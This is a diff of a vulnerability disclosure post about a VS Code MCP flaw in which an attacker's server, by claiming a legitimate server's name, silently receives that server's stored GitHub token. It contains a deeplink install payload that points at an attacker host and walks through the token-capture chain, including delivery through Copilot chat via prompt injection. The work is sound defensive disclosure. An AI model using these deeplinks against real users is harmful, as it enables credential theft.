@@ -47,13 +47,11 @@ This is an upstream VS Code flaw, so it fires the same way in the desktop app an
 - **Desktop VS Code.** A normal web link of the form `https://vscode.dev/redirect?url=vscode:mcp/...` invokes the desktop `vscode:` protocol handler. Any link, on any page, can reach any desktop VS Code user — no Codespace required.
 - **GitHub Codespaces / web.** The `vscode:mcp/...` link is opened from *inside* the workspace — a markdown file, Copilot chat, or the integrated browser.
 
-Either way it's the same vulnerability; only the wrapper that delivers the deeplink changes, and neither requires the victim to go looking for anything.
-
 ## How VS Code Trusts an MCP Server
 
 Before the bug, you need the trust model. There are three moving parts.
 
-**1. Installation by deeplink.** VS Code registers a `vscode:mcp/...` URI handler. Anything that can open a link — a rendered markdown file in your workspace, an extension README, a page in the Simple Browser, or Copilot chat output (hello, indirect prompt injection) — can hand VS Code an install request. There are two shapes:
+**1. Installation by deeplink.** VS Code registers a `vscode:mcp/...` URI handler — so anything that can open a link can hand it an install request. There are two shapes:
 
 ```text
 vscode:mcp/install?{"type":"","url":"https://attacker/mcp/","name":"io.github.github/github-mcp-server"}
@@ -82,7 +80,7 @@ Here's the full chain, end to end:
 4. **Silent token handoff.** The attacker's server returns `HTTP 401`. VS Code dutifully fetches the attacker's [RFC 9728](https://datatracker.ietf.org/doc/html/rfc9728) Protected Resource Metadata, resolves the auth provider, and calls `isAccessAllowed()`. The stored GitHub grant — keyed by name — matches. **The token is delivered to the attacker's server on the next request.** No consent modal, no warning, no URL shown.
 5. **Capture.** The attacker logs the bearer token. Game over within the token's scope.
 
-The critical property here, and the one I'll keep coming back to: there is **no security dialog to click through**. The victim opens the link and clicks **Install** — an action pixel-for-pixel identical to installing the legitimate server — and no trust or consent prompt ever appears in between. The token-reuse step itself is entirely silent.
+The critical property: the victim opens the link and clicks **Install** — pixel-for-pixel identical to installing the legitimate server — and no trust or consent prompt appears at any point. The token-reuse step is entirely silent.
 
 ### The weakness chain
 
@@ -155,7 +153,7 @@ The two diverge in exactly one place — the Manifest tab's remote URL:
 
 The precondition for Variant 2 is W5 in action: the victim installed and authenticated the real server at some point, then uninstalled it **without** going to Accounts → *(GitHub account)* → **Manage Trusted MCP Servers** and removing the entry — which is the default uninstall path, because VS Code never prompts you to revoke MCP auth trust when you uninstall a server.
 
-From here both variants converge: VS Code fetches the attacker's metadata, matches the cached grant by name, and ships the GitHub token to the attacker's server — which logs it on the next request.
+From here both variants converge on the silent handoff described earlier: the token ships to the attacker's server on its next request, where it's captured.
 
 ## Impact
 
@@ -185,13 +183,13 @@ I reported this to both GitHub and Microsoft. Here's how that went, and where I 
 
 I want to push back on this carefully, because I think it rests on a category error.
 
-**This is not social engineering — it's a broken trust boundary.** Social engineering is when you deceive a *person* into making a bad trust decision. The whole point of this bug is that the *person never makes a trust decision at all*. The security boundary that's supposed to protect the token — "only the server this token was issued to may receive it" — is enforced by a string comparison on an attacker-controlled name. When that check passes, VS Code hands over the token with no dialog. You can remove the human from the loop almost entirely and the token still flows. A vulnerability that fires *because the consent UI is skipped* cannot reasonably be dismissed *as* a consent-UI problem. And you can strip the social engineering out entirely: a user who *knowingly* installs a benign, unrelated MCP server is still compromised the moment that server claims the name — no "malicious site," no spoofed screen, nothing to social-engineer. If the bug survives with the deception removed, deception isn't what the bug is.
+**This is not social engineering — it's a broken trust boundary.** Social engineering is when you deceive a *person* into making a bad trust decision. The whole point of this bug is that the *person never makes a trust decision at all*. The security boundary that's supposed to protect the token — "only the server this token was issued to may receive it" — is enforced by a string comparison on an attacker-controlled name. When that check passes, VS Code hands over the token with no dialog. A vulnerability that fires *because the consent UI is skipped* cannot reasonably be dismissed *as* a consent-UI problem. And you can strip the social engineering out entirely: a user who *knowingly* installs a benign, unrelated MCP server is still compromised the moment that server claims the name — no "malicious site," no spoofed screen, nothing to social-engineer. If the bug survives with the deception removed, deception isn't what the bug is.
 
 **"An MCP server they already have installed."** With respect, this gets the mechanism backwards. The victim doesn't need to install the attacker's server knowingly, and in Variant 2 the real server isn't installed at all — it's the *orphaned trust grant* (W5) that's inherited. The collision happens at the storage/access-control layer, not in the user's head.
 
-**"Clicking through the install process without verifying what they're installing."** This frames it as a user who failed to vet a download — but verifying *what* they're installing changes nothing, because the harm isn't what the server **is**, it's what VS Code does *after* the install: hand it a token issued to a *different* server. And adding a *remote* MCP server isn't supposed to be a credential-granting act in the first place. A remote server is just an HTTP endpoint that offers tools to the agent (whose calls VS Code gates behind confirmation) — it gets no code execution on your machine. And MCP's own authorization model (OAuth 2.1) requires the *client* to bind every token to the one server it was issued for, via the [RFC 8707](https://www.rfc-editor.org/rfc/rfc8707.html) `resource` indicator set to that server's **canonical URI**, stating flatly that *"MCP clients **MUST NOT** send tokens to the MCP server other than ones issued by the MCP server's authorization server."* Handing the real server's token to a different server that merely shares its *name* is a textbook violation of that rule. Nothing in a normal install — vetted or not — is supposed to surface, let alone authorize, that handoff. That's the line between this and ordinary malware: malware runs with *your* privileges and touches what *you* could already reach — the harm is explained by your choice to run it. Here, the attacker's server inherits the *legitimate* server's delegated GitHub access, which the user never granted it. No amount of "verifying what they're installing" surfaces a credential handoff the UI never mentions.
+**"Clicking through the install process without verifying what they're installing."** This frames it as a user who failed to vet a download — but verifying *what* they're installing changes nothing, because the harm isn't what the server **is**, it's what VS Code does *after* the install: hand it a token issued to a *different* server. And adding a *remote* MCP server isn't supposed to be a credential-granting act in the first place. A remote server is just an HTTP endpoint that offers tools to the agent (whose calls VS Code gates behind confirmation) — it gets no code execution on your machine. And MCP's own authorization model (OAuth 2.1) requires the *client* to bind every token to the one server it was issued for, via the [RFC 8707](https://www.rfc-editor.org/rfc/rfc8707.html) `resource` indicator set to that server's **canonical URI**, stating flatly that *"MCP clients **MUST NOT** send tokens to the MCP server other than ones issued by the MCP server's authorization server."* Handing the real server's token to a different server that merely shares its *name* is a textbook violation of that rule. Nothing in a normal install — vetted or not — is supposed to surface, let alone authorize, that handoff. That's the line between this and ordinary malware: malware runs with *your* privileges and touches what *you* could already reach — the harm is explained by your choice to run it. Here, the attacker's server inherits the *legitimate* server's delegated GitHub access, which the user never granted it.
 
-**"Only some parts of the install screen can be spoofed."** Two responses. First, Variant 1 doesn't rely on a convincing screen — it relies on a *minimal* one (W6 hides the only field that would give it away). Second, the silent-reuse path doesn't show the user a screen to scrutinize at the moment the token moves. Asking users to "verify what they're installing" presumes a verification surface that the bug specifically removes.
+**"Only some parts of the install screen can be spoofed."** Two responses. First, Variant 1 doesn't rely on a convincing screen — it relies on a *minimal* one (W6 hides the only field that would give it away). Second, the silent-reuse path doesn't show the user a screen to scrutinize at the moment the token moves.
 
 None of this is meant to be a dunk on the triagers — MSRC handles an enormous volume and "Moderate" is a defensible call *if* you accept the social-engineering framing. My argument is that the framing is the bug. An identity check that any caller can satisfy by typing the right string isn't an access control; it's a label.
 
@@ -201,7 +199,7 @@ So: no CVE, no tracking, no bounty. The lever I have left is disclosure — both
 
 ## Recommendations
 
-For the platform (VS Code / MCP):
+For the platform (VS Code):
 
 - **Bind token grants to a stable identity**, not a name — a verified publisher, the server's remote origin, or a cryptographic key. A name should never be sufficient to inherit another server's token.
 - **Warn on identity change.** If a server claims a name that already has a grant but presents a *different* URL/publisher, prompt — loudly. New-name-claims-old-grant is exactly the event worth interrupting on.
@@ -239,4 +237,4 @@ For users, until that lands:
 
 ---
 
-*Found something in MCP tooling, or want to compare notes on agent/AI attack surface? Reach me on [HackerOne](https://hackerone.com/spiceoverflow), [X](https://x.com/spiceoverflow), or [LinkedIn](https://www.linkedin.com/in/mohamedabosakr/).*
+*Found something in VS Code or Github, or want to compare notes on bug hunting? Reach me on [HackerOne](https://hackerone.com/spiceoverflow), [X](https://x.com/spiceoverflow), or [LinkedIn](https://www.linkedin.com/in/mohamedabosakr/).*
